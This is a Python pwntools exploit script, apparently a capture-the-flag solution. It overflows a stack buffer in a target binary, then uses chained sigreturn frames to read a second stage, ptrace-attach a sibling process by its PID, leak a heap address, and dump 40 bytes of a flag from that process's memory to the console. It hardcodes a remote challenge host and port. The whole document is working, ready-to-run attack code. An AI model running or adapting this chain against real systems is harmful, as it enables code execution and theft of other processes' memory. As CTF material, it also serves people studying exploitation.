#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(args.BIN)

if args.LIBC:
    libc = ELF(args.LIBC)
else:
    libc = e.libc

r = ROP([e, libc])

gs = '''
b 0x40121c
continue
'''

RHOST = '172.105.155.54'
RPORT = '31337'

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(RHOST, RPORT)
    else:
        return process(e.path)
p = start()

# Fun stuff goes here
p.recvuntil(b'frequency is: ')
scottypid = int(p.recvline().strip())

log.success(f"PID of scotty is: {scottypid}")

fake_stack = 0x404100
srop_gadget = 0x401219

##############################################
# Initial foothold: SROP to read

chain = cyclic(24)
chain += p64(srop_gadget)

frame = SigreturnFrame()
frame.rip = srop_gadget+3 # syscall; ret;
frame.rax = 0 # SYS_read
frame.rdi = 0 # stdin
frame.rsi = fake_stack
frame.rdx = 0xffffffff
frame.rsp = fake_stack

chain += bytes(frame)

sleep(1)

p.sendline(chain)


##############################################
# First ptrace call: attach

chain = p64(srop_gadget)

frame = SigreturnFrame()
frame.rip = srop_gadget+3 # syscall; ret;
frame.rax = 0x65 # SYS_ptrace
frame.rdi = 16 # PTRACE_ATTACH
frame.rsi = scottypid
frame.rsp = fake_stack+256

chain += bytes(frame)


#############################################
# Second ptrace call: Leak target heap

chain += p64(srop_gadget)

frame = SigreturnFrame()
frame.rip = srop_gadget+3 # syscall; ret;
frame.rax = 0x65 # SYS_ptrace
frame.rdi = 2 # PTRACE_PEEKDATA
frame.rsi = scottypid
frame.rdx = 0x404050 # scotty.sym['thought1']
frame.r10 = fake_stack
frame.rsp = fake_stack+512

chain += bytes(frame)


#############################################
# Leak target heap: write(1, fake_stack, 8)

chain += p64(srop_gadget)

frame = SigreturnFrame()
frame.rip = srop_gadget+3 # syscall; ret;
frame.rax = 1 # SYS_write
frame.rdi = 1 # stdout
frame.rsi = fake_stack # contains leaked heap address
frame.rdx = 8
frame.rsp = fake_stack+512+256

chain += bytes(frame)


#############################################
# Reset fake stack now that target heap
# has been leaked

chain += p64(srop_gadget)

frame = SigreturnFrame()
frame.rip = srop_gadget+3 # syscall; ret;
frame.rax = 0 # SYS_read
frame.rdi = 0 # stdin
frame.rsi = fake_stack
frame.rdx = 0xffffffff
frame.rsp = fake_stack

chain += bytes(frame)

sleep(1)

p.sendline(chain)


#############################################
# Capture flag address

print(p.recvline())
print(p.recvline())
print(p.recvuntil(b'>>> '))

flag_addr = int.from_bytes(p.recv(), 'little')
log.success(f"Remote flag address: {hex(flag_addr)}")


#############################################
# PTRACE: first 8 bytes of flag

chain = p64(srop_gadget)

frame = SigreturnFrame()
frame.rip = srop_gadget+3 # syscall; ret;
frame.rax = 0x65 # SYS_ptrace
frame.rdi = 2 # PTRACE_PEEKDATA
frame.rsi = scottypid
frame.rdx = flag_addr
frame.r10 = fake_stack
frame.rsp = fake_stack + 256

chain += bytes(frame)


#############################################
# PTRACE: 8 more bytes of flag

chain += p64(srop_gadget)

frame = SigreturnFrame()
frame.rip = srop_gadget+3 # syscall; ret;
frame.rax = 0x65 # SYS_ptrace
frame.rdi = 2 # PTRACE_PEEKDATA
frame.rsi = scottypid
frame.rdx = flag_addr+8
frame.r10 = fake_stack+8
frame.rsp = fake_stack+(256*2)

chain += bytes(frame)


#############################################
# PTRACE: 8 more bytes of flag

chain += p64(srop_gadget)

frame = SigreturnFrame()
frame.rip = srop_gadget+3 # syscall; ret;
frame.rax = 0x65 # SYS_ptrace
frame.rdi = 2 # PTRACE_PEEKDATA
frame.rsi = scottypid
frame.rdx = flag_addr+(8*2)
frame.r10 = fake_stack+(8*2)
frame.rsp = fake_stack+(256*3)

chain += bytes(frame)


#############################################
# PTRACE: 8 more bytes of flag

chain += p64(srop_gadget)

frame = SigreturnFrame()
frame.rip = srop_gadget+3 # syscall; ret;
frame.rax = 0x65 # SYS_ptrace
frame.rdi = 2 # PTRACE_PEEKDATA
frame.rsi = scottypid
frame.rdx = flag_addr+(8*3)
frame.r10 = fake_stack+(8*3)
frame.rsp = fake_stack+(256*4)

chain += bytes(frame)


#############################################
# PTRACE: 8 more bytes of flag

chain += p64(srop_gadget)

frame = SigreturnFrame()
frame.rip = srop_gadget+3 # syscall; ret;
frame.rax = 0x65 # SYS_ptrace
frame.rdi = 2 # PTRACE_PEEKDATA
frame.rsi = scottypid
frame.rdx = flag_addr+(8*4)
frame.r10 = fake_stack+(8*4)
frame.rsp = fake_stack+(256*5)

chain += bytes(frame)


#############################################
# WRITE: Print flag to console

chain += p64(srop_gadget)

frame = SigreturnFrame()
frame.rip = srop_gadget+3 # syscall; ret;
frame.rax = 1 # SYS_write
frame.rdi = 1 # stdout
frame.rsi = fake_stack
frame.rdx = 40

chain += bytes(frame)

sleep(1)

p.sendline(chain)

p.interactive()
